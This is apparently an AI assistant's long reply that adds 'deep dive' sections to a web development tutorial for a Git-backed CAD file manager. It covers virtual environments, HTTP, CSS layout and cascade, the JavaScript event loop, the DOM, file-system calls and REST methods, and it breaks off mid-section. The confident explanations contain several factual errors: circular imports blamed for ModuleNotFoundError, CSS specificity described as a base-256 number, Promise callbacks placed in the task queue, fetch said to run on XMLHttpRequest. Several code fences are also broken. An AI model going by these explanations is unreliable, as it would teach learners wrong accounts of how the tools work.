I'll help you transform this into a comprehensive, production-grade tutorial that teaches fundamental concepts deeply. Let's go section by section. I'll start with the first major sections and we can continue systematically.

---

## **Enhanced: Product & Design Specification**

**Current Status:** Good foundation, but missing crucial systems thinking.

**Additions Needed:**

### **The Architecture Decision Record (ADR)**

Before the existing content, add:

### Why We're Building What We're Building: An Architecture Decision Record

Every professional project starts with documented decisions. Here's our ADR:

**Context:** Engineers need to collaborate on CAD files stored centrally, but:

- Network drives have no change tracking
- Git's learning curve is too steep for non-developers
- Cloud PDM systems are expensive and over-engineered for small teams

**Decision:** Build a Git-backed web application that abstracts Git complexity behind familiar "check-out/check-in" workflows.

**Consequences:**

- ✅ We get Git's powerful version control for free
- ✅ Users never see terminal commands
- ⚠️ We must handle large binary files (solved by Git LFS)
- ⚠️ We must handle concurrent edits (solved by lock files)

**Alternatives Considered:**

1. SharePoint - rejected due to poor version control
2. Commercial PDM - rejected due to cost
3. Pure Git - rejected due to user experience

### **System Design: The Big Picture**

Add a visual architecture explanation:

### Mental Model: The Three-Layer Architecture

Think of our application like a restaurant:

**Layer 1: The Kitchen (Backend - FastAPI)**

- The chef (API endpoints) receives orders (HTTP requests)
- The pantry (GitLab repo) stores all ingredients (data)
- Recipes (business logic) determine how ingredients become dishes

**Layer 2: The Menu (API Contract)**

- JSON is the "language" the kitchen and dining room use to communicate
- Each endpoint is a menu item with specific ingredients (parameters) and presentation (response format)

**Layer 3: The Dining Room (Frontend - Browser)**

- The waiter (JavaScript) takes orders from customers (user actions)
- The presentation (HTML/CSS) makes everything look appetizing
- The order form (DOM manipulation) updates based on what the kitchen sends back

**Critical Concept: Statelessness**
The kitchen doesn't remember who ordered what between requests. Every request must be self-contained (hence the JWT token with every API call). This is like a food truck where you must show your receipt every time you ask for something.

---

## **Level 0: Enhanced with Systems Thinking**

**Current:** Adequate setup instructions
**Missing:** Computer science fundamentals about environments

**Add after the "Why" section:**

### Deep Dive: Virtual Environments and Dependency Management

**The Problem We're Solving:**

Imagine you have two Python projects:

- Project A needs library X version 1.0
- Project B needs library X version 2.0

Without virtual environments, installing one would break the other. This is "dependency hell."

**The Solution Architecture:**

A virtual environment creates an isolated Python installation in a folder:

```

pdm_tutorial/
├── venv/
│ ├── bin/ # Isolated Python executable
│ ├── lib/ # Isolated library copies
│ └── include/ # Header files for compilation

```

When activated, your terminal's `PATH` variable is temporarily modified:

```bash
# Before activation
which python → /usr/bin/python  (system Python)

# After activation
which python → ./venv/bin/python  (isolated Python)
```

**The Data Structure Behind `pip install`:**

When you run `pip install fastapi`:

1. Pip queries PyPI (Python Package Index) API
2. Downloads a `.whl` (wheel) file - it's a ZIP archive
3. Extracts to `venv/lib/python3.x/site-packages/`
4. Updates `venv/lib/python3.x/site-packages/easy-install.pth` (a linked list of import paths)

**Why This Matters:**
Understanding this helps you debug "ModuleNotFoundError". The error means Python traversed its import path list and didn't find the module - usually because:

- You're not in the activated venv
- The package isn't installed in THIS venv
- There's a circular import (graph cycle detection problem)

---

## **Level 1: Enhanced with HTTP Protocol Deep Dive**

**Current:** Explains FastAPI basics
**Missing:** The underlying HTTP/networking concepts

**Add before "Code Explained":**

### Computer Networking 101: What Actually Happens When You Visit a URL

**The 7-Layer Journey:**

When you type `http://127.0.0.1:8000` and press Enter:

**Application Layer (Layer 7):**
Your browser constructs an HTTP request:

```http
GET / HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0...
Accept: text/html,application/json...
```

**Transport Layer (Layer 4 - TCP):**

- The OS creates a TCP socket (a data structure representing a connection)
- TCP performs the "three-way handshake":
  1. SYN: "Can we talk?" →
  2. ← SYN-ACK: "Yes, ready"
  3. ACK: "Great, here's my request" →

**Network Layer (Layer 3 - IP):**

- IP address 127.0.0.1 is special: the "loopback" interface
- The packet never leaves your computer - it's routed back to yourself
- This is why it works without internet

**The Response Journey Back:**

FastAPI constructs:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 47

{"message": "Hello from the PDM Backend!"}
```

**Status Codes as a Finite State Machine:**

HTTP status codes represent state transitions:

- 2xx: Success state
- 3xx: Redirection state (resource moved)
- 4xx: Client error state (you did something wrong)
- 5xx: Server error state (I did something wrong)

**Data Structure: The Request/Response Cycle:**

Think of it as a queue (FIFO):

```
Request Queue → [Process] → Response Queue
    ↓              ↓             ↓
FastAPI's         Worker        Your
EventLoop         Thread        Browser
```

FastAPI uses async/await to handle multiple requests concurrently without blocking (covered in Level 5).

````

---

## **Level 2: Enhanced with CSS Box Model Fundamentals**

**Current:** Shows basic HTML templating
**Missing:** CSS fundamentals aren't explained

**Add entirely new section after Step 4:**

```markdown
### Deep Dive: The CSS Box Model (The Foundation of All Layout)

**The Problem:** HTML without CSS is just a vertical list of elements. CSS positions them in 2D space.

**The Box Model: Every Element is a Box**

Every HTML element is rendered as a rectangular box with four layers:

````

┌─────────────────────────── Margin ────────────────────────────┐
│ ┌────────────────────── Border ──────────────────────────┐ │
│ │ ┌──────────────── Padding ────────────────────────┐ │ │
│ │ │ │ │ │
│ │ │ Content (text, images, etc.) │ │ │
│ │ │ │ │ │
│ │ └──────────────────────────────────────────────────┘ │ │
│ └──────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────────┘

````

**Sizing Algorithm:**

By default, width/height apply ONLY to content:
```css
.box {
    width: 200px;        /* Content width */
    padding: 20px;       /* Added to width */
    border: 5px solid;   /* Added to width */
    /* Total width = 200 + 20 + 20 + 5 + 5 = 250px */
}
````

**The Critical Fix: box-sizing**

```css
* {
  box-sizing: border-box; /* Width now includes padding and border */
}
```

**The Display Property: Block vs Inline**

This is a state machine for layout behavior:

**Block elements** (state: "fill-width"):

- Take full width of parent
- Stack vertically
- Can have width/height set
- Example: `<div>`, `<p>`, `<h1>`

**Inline elements** (state: "flow-with-text"):

- Only as wide as content
- Flow horizontally (like words in a sentence)
- CANNOT have width/height set
- Example: `<span>`, `<a>`, `<strong>`

**Inline-block** (state: "hybrid"):

- Flows horizontally BUT respects width/height
- The "best of both worlds" for custom buttons

**Practical Example:**

```css
/* Why this navigation breaks */
nav a {
  width: 100px; /* Ignored! <a> is inline by default */
}

/* The fix */
nav a {
  display: inline-block; /* Now respects width */
  width: 100px;
}
```

```

---

Should I continue with:
1. **Level 3** (DOM manipulation, Event Loop, async/await deep dive)
2. **Flexbox** (Level 23's nav bar - add complete flexbox mental model)
3. **Authentication** (Levels 17-20 - JWT anatomy, cryptography basics)
4. **Git internals** (Level 21 - how Git actually stores data)

Which area would you like me to elaborate on next, or should I continue sequentially through all levels?
```

## **Level 3 Enhancement: Making it Dynamic - The First API Call**

**Reference:** Your tutorial covers the basic setup of serving static files and making a fetch request.

**Missing Foundations:** The tutorial jumps to `async/await` and `fetch` without explaining the revolutionary paradigm shift this represents. Let me add the critical computer science concepts:

---

### **Deep Dive: The JavaScript Event Loop (The Engine Behind Everything)**

**The Core Problem:** JavaScript runs in a single thread. Without special handling, any slow operation (like network requests) would freeze your entire webpage.

**The Solution: The Event Loop (A Masterpiece of Systems Design)**

JavaScript's concurrency model is based on three data structures:

```
┌─────────────────────────────────────────────────┐
│                  Call Stack                     │
│  (LIFO - Last In, First Out)                   │
│  [function3()]                                  │
│  [function2()]                                  │
│  [function1()]                                  │
└─────────────────────────────────────────────────┘
         ↓ When stack is empty
┌─────────────────────────────────────────────────┐
│              Task Queue                         │
│  (FIFO - First In, First Out)                  │
│  [callback1] → [callback2] → [callback3]        │
└─────────────────────────────────────────────────┘
         ↓ Jobs added from
┌─────────────────────────────────────────────────┐
│              Web APIs                           │
│  • setTimeout                                   │
│  • fetch (network requests)                     │
│  • DOM events (clicks, etc.)                   │
└─────────────────────────────────────────────────┘
```

**How It Actually Works (Step by Step):**

```javascript
console.log("1: Start");

fetch("/api/files") // This happens NOW
  .then((data) => console.log("3: Got data"));

console.log("2: End");

// Output order: 1, 2, 3
// Why? Let's trace it:
```

**Execution Trace:**

1. **`console.log('1: Start')`** → Goes on Call Stack → Executes immediately → Logs "1"
2. **`fetch('/api/files')`** → Call Stack sees this is a Web API → Hands it to the browser's networking thread → Returns IMMEDIATELY with a Promise object
3. **`.then(...)`** → Registers a callback to the Promise → Promise goes to Task Queue (waiting)
4. **`console.log('2: End')`** → Call Stack executes immediately → Logs "2"
5. **Call Stack is now empty** → Event Loop checks Task Queue
6. Network response arrives → Promise resolves → Callback moves to Call Stack
7. **`console.log('3: Got data')`** → Executes → Logs "3"

**The Critical Insight:** `fetch` doesn't block because it's not JavaScript executing the network request - it's the browser's lower-level networking code (written in C++). JavaScript just registers "call me back when done" and moves on.

---

### **Promises: A State Machine for Async Operations**

Your tutorial uses `async/await`, but you need to understand the underlying Promise mechanism:

**A Promise is a state machine with three states:**

```
     ┌─────────────┐
     │  PENDING    │ ← Initial state
     └──────┬──────┘
            │
        ┌───┴───┐
        ↓       ↓
   ┌─────────┐ ┌─────────┐
   │FULFILLED│ │ REJECTED │ ← Terminal states
   └─────────┘ └─────────┘
```

**Under the Hood (Simplified Implementation):**

```javascript
class SimplePromise {
  constructor(executor) {
    this.state = "PENDING";
    this.value = undefined;
    this.handlers = []; // Queue of .then() callbacks

    const resolve = (result) => {
      if (this.state !== "PENDING") return; // Can't transition twice
      this.state = "FULFILLED";
      this.value = result;
      this.handlers.forEach((handler) => handler(result)); // Execute all waiting callbacks
    };

    executor(resolve); // Run the async operation
  }

  then(onFulfilled) {
    if (this.state === "FULFILLED") {
      onFulfilled(this.value); // Already done? Execute immediately
    } else {
      this.handlers.push(onFulfilled); // Not done? Queue it
    }
  }
}
```

**`async/await` is Syntactic Sugar:**

```javascript
// These are equivalent:

// Promise syntax (what's actually happening)
function loadFiles() {
  return fetch("/api/files")
    .then((response) => response.json())
    .then((files) => renderFiles(files));
}

// async/await syntax (compiler transformation)
async function loadFiles() {
  const response = await fetch("/api/files"); // Pause here, resume when Promise resolves
  const files = await response.json(); // Pause here too
  renderFiles(files);
}

// The compiler transforms async/await into Promise chains behind the scenes
```

---

### **The DOM: A Tree Data Structure**

Your tutorial manipulates the DOM but doesn't explain what it fundamentally IS.

**The DOM is an in-memory tree (specifically, a rose tree - nodes with arbitrary children):**

```html
<div id="file-list">
  <p>Loading files...</p>
</div>
```

**Gets parsed into this data structure:**

```
          [HTMLDivElement]
          id="file-list"
                 │
                 └─── [HTMLParagraphElement]
                           │
                           └─── [TextNode: "Loading files..."]
```

**Each node is an object in memory:**

```javascript
{
    nodeType: 1,  // ELEMENT_NODE
    nodeName: "DIV",
    attributes: { id: "file-list" },
    children: [  // Array (dynamic resizing)
        {
            nodeType: 1,
            nodeName: "P",
            children: [
                { nodeType: 3, textContent: "Loading files..." }
            ]
        }
    ],
    parentNode: [reference to body],
    nextSibling: null,
    previousSibling: null
}
```

**DOM Manipulation Algorithms:**

1. **`.getElementById()`** → Hash table lookup O(1)

   - Browser maintains a hash map: `{ "file-list": <reference to node> }`

2. **`.querySelector()`** → CSS selector parsing + tree traversal O(n)

   - Uses Depth-First Search (DFS) algorithm
   - More flexible but slower

3. **`.innerHTML = ""`** → Expensive operation:

   - Parse string into tokens (lexing)
   - Build new tree structure (parsing)
   - Garbage collect old nodes
   - Trigger browser reflow/repaint

4. **`.insertAdjacentHTML()`** → More efficient:
   - Only parses new content
   - Inserts at specific position without rebuilding siblings

**The Reflow/Repaint Pipeline (Why DOM updates can be slow):**

```
Change DOM → Style Calculation → Layout (Reflow) → Paint → Composite
  O(1)          O(n)               O(n)            O(n)      O(n)
```

When you modify the DOM, the browser must:

1. **Recalculate styles**: Which CSS rules apply?
2. **Reflow**: Where does each box go on screen? (expensive - geometry calculations)
3. **Repaint**: Render pixels for each box
4. **Composite**: Layer multiple paint layers together

**This is why we batch DOM updates:**

```javascript
// BAD: Causes 100 reflows
for (let i = 0; i < 100; i++) {
  const div = document.createElement("div");
  document.body.appendChild(div); // Reflow after EACH append
}

// GOOD: Causes 1 reflow
const fragment = document.createDocumentFragment(); // In-memory tree
for (let i = 0; i < 100; i++) {
  const div = document.createElement("div");
  fragment.appendChild(div); // Modify in-memory tree
}
document.body.appendChild(fragment); // Single reflow
```

---

### **Network I/O: What Actually Happens During `fetch()`**

**The layers of abstraction:**

```
Your Code: fetch('/api/files')
    ↓
Browser's Fetch API (JavaScript)
    ↓
XMLHttpRequest / Network Thread (C++)
    ↓
Operating System Socket API
    ↓
TCP/IP Network Stack
    ↓
Physical Network Interface
```

**The HTTP Request Packet Structure:**

```
GET /api/files HTTP/1.1
Host: 127.0.0.1:8000
Accept: application/json
Connection: keep-alive

[Request ends with \r\n\r\n]
```

**Key Concepts:**

1. **Port Numbers** (0-65535): Like apartment numbers

   - 8000 is where our FastAPI server "listens"
   - Browser picks random port >1024 for itself

2. **Keep-Alive**: TCP connection stays open for multiple requests

   - Opening TCP connection is expensive (3-way handshake)
   - Reusing the connection saves time

3. **Response Streaming**: Large responses arrive in chunks
   - `response.json()` waits for full response, then parses
   - Alternative: `response.body.getReader()` for streaming

---

### **Error Handling: The Often-Ignored Critical Path**

Your tutorial's `try/catch` is good, but let's explain the error propagation:

**JavaScript Error Bubbling:**

```javascript
async function loadFiles() {
  try {
    const response = await fetch("/api/files");
    const files = await response.json(); // Can throw SyntaxError
    renderFiles(files); // Can throw TypeError
  } catch (error) {
    // Which error was thrown? We need to check:
    if (error instanceof TypeError) {
      console.error("Data structure mismatch");
    } else if (error instanceof SyntaxError) {
      console.error("Server sent invalid JSON");
    } else if (error.name === "NetworkError") {
      console.error("Network request failed");
    }
  }
}
```

**The Unhandled Rejection Problem:**

```javascript
// DANGEROUS: Promise rejection not caught
fetch("/api/files")
  .then((response) => response.json())
  .then((data) => renderFiles(data));
// If renderFiles throws, error is LOST

// SAFE: Error handler at the end
fetch("/api/files")
  .then((response) => response.json())
  .then((data) => renderFiles(data))
  .catch((error) => handleError(error)); // Catches errors from ANY .then()
```

---

**Practice Exercise for Understanding:**

Before moving to Level 4, write this function from scratch without looking at the tutorial:

```javascript
// Implement this without using your tutorial's code:
async function debugLoadFiles() {
  console.log("[1] Starting load");

  const response = await fetch("/api/files");
  console.log("[2] Got response:", response.status);

  const data = await response.json();
  console.log("[3] Parsed JSON:", data.length, "items");

  document.getElementById("file-list").innerHTML = "";
  data.forEach((file) => {
    const elem = document.createElement("div");
    elem.textContent = file.name;
    document.getElementById("file-list").appendChild(elem);
  });

  console.log("[4] DOM updated");
}

// Question: In what order do the console.logs appear?
// Why does [4] appear before the screen visually updates?
```

**Answer the why before moving forward.**

---

Ready for Level 4 when you are. Let me know when you've copied this section.

## **Level 4 Enhancement: Real Data and a Touch of Style (CSS)**

**Reference:** Your tutorial covers reading files with `os.listdir()` and basic CSS styling.

**Missing Foundations:** File system abstractions, CSS cascade mechanics, and the critical concept of separation of concerns.

---

### **Part 1: File Systems - The OS Abstraction Layer**

**The Fundamental Concept: Everything is a File**

In Unix-like systems (including macOS, Linux, and Windows' modern layers), the operating system presents a unified abstraction: files and directories are nodes in a tree.

```
Root (/)
  ├── repo/
  │     ├── PN1001_OP1.mcam  (inode #12345)
  │     └── PN1002_OP1.mcam  (inode #12346)
  ├── locks.json (inode #12347)
  └── metadata.json (inode #12348)
```

**What `os.listdir()` Actually Does:**

```python
repo_files = os.listdir(REPO_PATH)
```

**Step-by-step system call trace:**

1. **Python calls C library**: `os.listdir()` is a thin wrapper around POSIX `readdir()`
2. **System call to kernel**: Enters kernel space via `syscall` instruction
3. **Kernel looks up directory inode**:
   - Filesystem maintains an inode table (like a database)
   - Each entry contains metadata: permissions, timestamps, disk block locations
4. **Read directory entries**:
   - Directory is just a special file listing `(filename, inode)` pairs
   - Stored as an array or B-tree depending on filesystem (ext4 uses htree)
5. **Return to user space**: Kernel copies data to Python's memory

**Data Structure Returned:**

```python
# os.listdir returns a list of strings (Python array = dynamic array in C)
['PN1001_OP1.mcam', 'PN1002_OP1.mcam', 'locks.json']

# In memory, Python stores this as:
# [ptr to str obj 1] → PyUnicodeObject("PN1001_OP1.mcam")
# [ptr to str obj 2] → PyUnicodeObject("PN1002_OP1.mcam")
# [ptr to str obj 3] → PyUnicodeObject("locks.json")
```

---

### **The `.endswith()` String Algorithm**

```python
if filename.endswith(".mcam"):
```

**What this compiles to (conceptually):**

```python
# CPython implementation (simplified)
def endswith(string, suffix):
    if len(string) < len(suffix):
        return False

    # Slice from the end: O(n) where n = len(suffix)
    return string[-len(suffix):] == suffix

    # Alternative implementation using pointer arithmetic:
    # Compare bytes from end backwards - stops early on mismatch
```

**Why this matters for performance:**

```python
# INEFFICIENT: Regex overkill for simple suffix check
import re
if re.match(r'.*\.mcam$', filename):  # Builds state machine, scans entire string

# EFFICIENT: Built-in string method optimized in C
if filename.endswith('.mcam'):  # Direct byte comparison from end
```

**Better pattern for multiple extensions:**

```python
VALID_EXTENSIONS = {'.mcam', '.nc', '.tap'}  # Set = O(1) lookup

# Good: Set membership test
if Path(filename).suffix in VALID_EXTENSIONS:

# Bad: Multiple string comparisons
if filename.endswith('.mcam') or filename.endswith('.nc') or filename.endswith('.tap'):
```

---

### **Error Handling: The `try/except` Control Flow**

Your tutorial uses:

```python
try:
    repo_files = os.listdir(REPO_PATH)
except FileNotFoundError:
    print(f"ERROR: The repository directory '{REPO_PATH}' was not found.")
    return []
```

**What's happening under the hood:**

**Exception handling is implemented using jump tables:**

```
Normal execution path:
1. Call os.listdir()
2. Build files_to_return list
3. Return result

Exception path:
1. Call os.listdir()
2. ❌ Raise FileNotFoundError
3. Stack unwinding begins
4. Check exception table for try/except block
5. Jump to except handler
6. Execute error handling code
7. Continue from after try/except
```

**The Exception Table (compiler-generated):**

```python
# The compiler builds a table like:
[
    {
        'try_start': line 42,
        'try_end': line 46,
        'except_type': FileNotFoundError,
        'handler_start': line 47
    }
]
```

**Cost of exceptions:**

- Raising an exception: Expensive (10-100x slower than normal return)
- try/except block with NO exception: Nearly free (just table entry)
- Exceptions should be for exceptional cases, not control flow

**Anti-pattern (don't do this):**

```python
# BAD: Using exceptions for control flow
try:
    value = my_dict['key']
except KeyError:
    value = 'default'

# GOOD: Use dictionary method
value = my_dict.get('key', 'default')
```

---

### **Part 2: CSS Deep Dive - The Cascade Algorithm**

Your tutorial adds CSS but doesn't explain the "C" in CSS - the Cascade.

**The Cascade: Three-Stage Conflict Resolution**

When multiple CSS rules target the same element, the browser uses this algorithm:

**Stage 1: Origin and Importance**

```
1. User !important declarations (accessibility overrides)
2. Author !important declarations (your CSS)
3. Author normal declarations
4. User normal declarations
5. Browser default styles
```

**Stage 2: Specificity (If origin ties)**

CSS specificity is a base-256 number with four components:

```
[inline-style, IDs, classes/attributes, elements]

Examples:
div                           → (0,0,0,1) = 1
.file-item                    → (0,0,1,0) = 256
#file-list                    → (0,1,0,0) = 65536
div.file-item                 → (0,0,1,1) = 257
#file-list .file-item         → (0,1,1,0) = 65792
style="color: red"            → (1,0,0,0) = 16777216
```

**Practical example from your tutorial:**

```css
/* Specificity: (0,0,0,1) = 1 */
p {
  color: black;
}

/* Specificity: (0,0,1,0) = 256 - WINS */
.file-description {
  color: #65676b;
}

/* Specificity: (0,0,1,1) = 257 - WINS EVEN MORE */
.file-item .file-description {
  color: #888;
}
```

**The specificity calculation algorithm:**

```javascript
function calculateSpecificity(selector) {
  let inline = 0,
    ids = 0,
    classes = 0,
    elements = 0;

  // Parse selector string (simplified)
  inline = selector.includes("style=") ? 1 : 0;
  ids = (selector.match(/#/g) || []).length;
  classes = (selector.match(/\./g) || []).length;
  elements = (selector.match(/^[a-z]+/g) || []).length;

  return [inline, ids, classes, elements];
}

// Compare using lexicographic order (left to right)
```

**Stage 3: Source Order (If specificity ties)**

Last rule wins:

```css
.button {
  color: blue;
} /* Defined first */
.button {
  color: red;
} /* Defined second - WINS */
```

---

### **CSS Inheritance: The Family Tree Algorithm**

Some properties inherit from parent to child (like a tree traversal):

**Inherited properties:**

- Font properties (font-family, font-size, font-weight)
- Text properties (color, line-height, text-align)
- Visibility

**Non-inherited properties:**

- Box model (margin, padding, border, width, height)
- Background properties
- Positioning

**How the browser resolves values:**

```html
<div style="color: blue; border: 1px solid black;">
  <p>Hello</p>
  <!-- What color and border? -->
</div>
```

**Resolution algorithm for `<p>`:**

1. **Specified value**: Check if `p` has explicit `color` rule → NO
2. **Inherited value**: Check if `color` inherits → YES → Use parent's blue
3. **Specified value**: Check if `p` has explicit `border` rule → NO
4. **Inherited value**: Check if `border` inherits → NO
5. **Initial value**: Use CSS default for `border` → none

---

### **The CSSOM: Another Tree Data Structure**

Just as HTML becomes the DOM tree, CSS becomes the CSSOM (CSS Object Model):

```css
body {
  font-size: 16px;
}
.file-item {
  padding: 1rem;
}
```

**Becomes in-memory structure:**

```
CSSStyleSheet
  ├── CSSRule (selector: "body")
  │      └── CSSStyleDeclaration
  │            └── { font-size: "16px" }
  └── CSSRule (selector: ".file-item")
         └── CSSStyleDeclaration
               └── { padding: "1rem" }
```

**The browser combines DOM + CSSOM to create the Render Tree:**

```
DOM Node: <div class="file-item">
    +
CSSOM Rules: .file-item { padding: 1rem; }
    =
Render Object: {
    element: div,
    computedStyle: {
        padding: "16px",  // rem converted to px
        display: "block",
        // ...hundreds more properties
    }
}
```

---

### **Units and Computed Values**

Your tutorial uses `rem` - let's explain the unit system:

**Absolute units:**

- `px`: 1 pixel (not actually device pixels - see below)
- `pt`: 1/72 inch (print media)
- `cm`, `mm`, `in`: Physical units

**Relative units:**

- `em`: Relative to parent's font-size
- `rem`: Relative to root (`<html>`) font-size
- `%`: Relative to parent's corresponding property
- `vw/vh`: Relative to viewport dimensions

**The computation cascade:**

```css
html {
  font-size: 16px;
} /* Root */
.parent {
  font-size: 1.5em;
} /* 1.5 × 16 = 24px */
.child {
  font-size: 2em; /* 2 × 24 = 48px (em uses parent) */
  padding: 1rem; /* 1 × 16 = 16px (rem uses root) */
}
```

**Why `rem` is better than `em` for spacing:**

```css
/* With em, spacing compounds */
.card {
  padding: 1em;
} /* 16px */
.card .inner {
  padding: 1em;
} /* 24px if parent has font-size: 1.5em */
.card .inner .deep {
  padding: 1em;
} /* 36px - gets bigger and bigger! */

/* With rem, spacing is consistent */
.card {
  padding: 1rem;
} /* 16px */
.card .inner {
  padding: 1rem;
} /* 16px - always relative to root */
.card .inner .deep {
  padding: 1rem;
} /* 16px - consistent! */
```

**Device pixels vs CSS pixels:**

Modern high-DPI displays have `devicePixelRatio`:

```javascript
// On a Retina display:
window.devicePixelRatio === 2;

// 1 CSS pixel = 2×2 = 4 device pixels
// This is why images need @2x versions
```

---

### **Color Values: Binary Representation**

```css
color: #65676b;
```

**This hexadecimal color is:**

```
# 65   67   6b
  |    |    |
  R    G    B

Decimal: (101, 103, 107)
Binary:  01100101 01100111 01101011

Stored in memory as:
struct Color {
    uint8_t r;  // 1 byte: 0-255
    uint8_t g;  // 1 byte: 0-255
    uint8_t b;  // 1 byte: 0-255
    uint8_t a;  // 1 byte: alpha (opacity)
};
// Total: 4 bytes (32 bits)
```

**Why 256 values per channel?**

- 1 byte = 8 bits = 2^8 = 256 possible values
- 3 channels = 256³ = 16.7 million possible colors
- Human eye can distinguish ~10 million colors (good enough)

**Alpha channel (transparency):**

```css
/* rgb() - no alpha */
background: rgb(101, 103, 107);

/* rgba() - with alpha */
background: rgba(101, 103, 107, 0.5); /* 50% transparent */

/* Hex with alpha */
background: #65676b80; /* Last 2 digits = 128/255 ≈ 50% */
```

---

### **Performance: Style Recalculation Triggers**

Your tutorial modifies the DOM with `innerHTML +=`. Let's analyze the cost:

**Browser rendering pipeline:**

```
JS Execution → Style Calc → Layout → Paint → Composite
```

**What triggers each stage:**

1. **Style Calc**: Changing classes, adding/removing elements

   - Cost: O(elements × CSS rules)
   - Browser must re-match selectors

2. **Layout (Reflow)**: Changing geometric properties

   - Triggers: width, height, padding, margin, display, position
   - Cost: O(entire tree) - must recalculate every element's position
   - Most expensive operation

3. **Paint**: Changing visual properties

   - Triggers: color, background, box-shadow, border-radius
   - Cost: O(painted region)
   - Cheaper than reflow, but still expensive

4. **Composite**: Changing compositor-only properties
   - Triggers: transform, opacity, filter
   - Cost: O(1) - handled by GPU
   - Cheapest operation

**Optimizing your tutorial's code:**

```javascript
// SLOW: Triggers reflow 100 times
for (let i = 0; i < 100; i++) {
  fileList.innerHTML += `<div>${file.name}</div>`;
  // Each += forces:
  // 1. Style calculation
  // 2. Layout (reflow)
  // 3. Paint
}

// FASTER: Single reflow
let html = "";
for (let i = 0; i < 100; i++) {
  html += `<div>${file.name}</div>`;
}
fileList.innerHTML = html; // One reflow at the end

// FASTEST: DocumentFragment (what you should use)
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  const div = document.createElement("div");
  div.textContent = file.name;
  fragment.appendChild(div); // No reflow - fragment is off-DOM
}
fileList.appendChild(fragment); // Single reflow
```

---

### **Critical Rendering Path: From Code to Pixels**

When you set `innerHTML`, this happens:

**1. HTML Parsing (Tokenization):**

```
Input: "<div class='file-item'>Hello</div>"

Tokenizer (FSM - Finite State Machine):
State: DATA
  '<' → State: TAG_OPEN
  'd' → State: TAG_NAME
  ...

Tokens produced:
[StartTag(div), Attribute(class, file-item), Characters(Hello), EndTag(div)]
```

**2. DOM Construction:**

```
Tokens → DOM Tree Builder

Builder maintains a stack:
[html, body]  ← Current insertion point

When seeing StartTag(div):
  Create HTMLDivElement
  Add to current parent (body)
  Push div onto stack: [html, body, div]

When seeing Characters(Hello):
  Create TextNode("Hello")
  Add to current parent (div)

When seeing EndTag(div):
  Pop div from stack: [html, body]
```

**3. Style Resolution:**

```
For each DOM node:
  1. Collect matching CSS rules
  2. Sort by specificity
  3. Compute final values (em→px, inherit, etc.)
  4. Store in ComputedStyle object
```

**4. Layout (Box Generation):**

```
For each node with computed style:
  1. Determine box type (block, inline, flex, grid)
  2. Calculate dimensions based on:
     - CSS properties
     - Content size
     - Parent constraints
  3. Position box in coordinate space
  4. Create LayoutBox object with coordinates
```

**5. Paint:**

```
For each LayoutBox:
  1. Determine paint order (z-index, stacking context)
  2. Create display list:
     [DrawRectangle(bounds, background-color),
      DrawBorder(bounds, border-style),
      DrawText(position, font, color, text)]
```

**6. Composite:**

```
If using GPU acceleration:
  1. Upload paint layers to GPU memory
  2. GPU composites layers using transform matrices
  3. Present final frame to screen
```

---

**Practice Exercise:**

Create a performance test to see the difference:

```javascript
// Test innerHTML vs DocumentFragment
function testPerformance() {
  const testData = Array(1000)
    .fill()
    .map((_, i) => ({ name: `File${i}` }));

  // Method 1: innerHTML
  console.time("innerHTML");
  let html = "";
  testData.forEach((file) => {
    html += `<div>${file.name}</div>`;
  });
  document.getElementById("test1").innerHTML = html;
  console.timeEnd("innerHTML");

  // Method 2: DocumentFragment
  console.time("fragment");
  const fragment = document.createDocumentFragment();
  testData.forEach((file) => {
    const div = document.createElement("div");
    div.textContent = file.name;
    fragment.appendChild(div);
  });
  document.getElementById("test2").appendChild(fragment);
  console.timeEnd("fragment");
}

// Run in browser console - you should see fragment is 2-5x faster
```

**Question to answer:** Why is fragment faster if both only cause a single reflow?

**Answer:** `innerHTML` requires:

1. String concatenation (O(n²) in worst case - repeated string copying)
2. HTML parsing (tokenizing, tree building)
3. DOM node creation

DocumentFragment:

1. Direct DOM node creation (no parsing)
2. Appends in tree structure (O(n))

---

Ready for Level 5 (Interactivity & State - Checking Out a File) when you've copied this section. Let me know when ready to continue.

## **Level 5 Enhancement: Interactivity & State - Checking Out a File**

**Reference:** Your tutorial implements checkout/checkin with a `locks.json` file and introduces POST requests.

**Missing Foundations:** HTTP semantics, state management theory, serialization, and the critical concept of data persistence.

---

### **Part 1: HTTP Methods - The RESTful Architecture**

Your tutorial uses `@app.get()` and `@app.post()`. These aren't arbitrary - they're part of a formal architectural style called REST (Representational State Transfer).

**HTTP Methods as CRUD Operations:**

```
Database Operation  →  HTTP Method  →  SQL Equivalent
────────────────────────────────────────────────────
Create              →  POST         →  INSERT
Read                →  GET          →  SELECT
Update              →  PUT/PATCH    →  UPDATE
Delete              →  DELETE       →  DELETE
```

**The HTTP Method Contract (RFC 7231):**

Each method has specific semantic properties:

**1. Safe Methods (Read-Only):**

```
GET, HEAD, OPTIONS
- MUST NOT modify server state
- Can be cached
- Can be prefetched by browsers
- Idempotent (calling multiple times = same result)
```

**Why this matters:**

```python
# BAD: GET should not modify state
@app.get("/api/files/delete/{filename}")  # ❌ Violates HTTP semantics
async def delete_file(filename: str):
    os.remove(filename)  # Side effect in GET!

# Browser prefetch could accidentally delete files!
# Web crawlers could destroy your data!

# GOOD: DELETE for destructive operations
@app.delete("/api/files/{filename}")  # ✓ Correct HTTP method
async def delete_file(filename: str):
    os.remove(filename)
```

**2. Idempotent Methods:**

```
GET, PUT, DELETE, HEAD, OPTIONS
- Calling N times has same effect as calling once
- Safe to retry on network failure
```

**Example:**

```python
# PUT is idempotent
PUT /api/files/test.mcam
{ "description": "New description" }

# Call it 1 time: Description = "New description"
# Call it 5 times: Description still = "New description"
# Result is the same!

# POST is NOT idempotent
POST /api/files/checkout
{ "filename": "test.mcam" }

# Call it 1 time: File checked out
# Call it 5 times: Error! Already checked out
# Different result!
```

**Why idempotency matters:**

```javascript
// Network is unreliable - request might timeout but succeed
fetch("/api/files/checkout", { method: "POST" }).catch((error) => {
  // Should we retry? We don't know if it succeeded!
  // POST is not idempotent - retry could cause double-checkout
});

// vs idempotent operation
fetch("/api/files/test.mcam", {
  method: "PUT",
  body: JSON.stringify({ description: "New" }),
}).catch((error) => {
  // Safe to retry - PUT is idempotent
  return fetch("/api/files/test.mcam", {
    method: "PUT",
    body: JSON.stringify({ description: "New" }),
  });
});
```

---

### **The POST Request Lifecycle (In Depth)**

When you click "Checkout" button:

**1. JavaScript constructs request:**

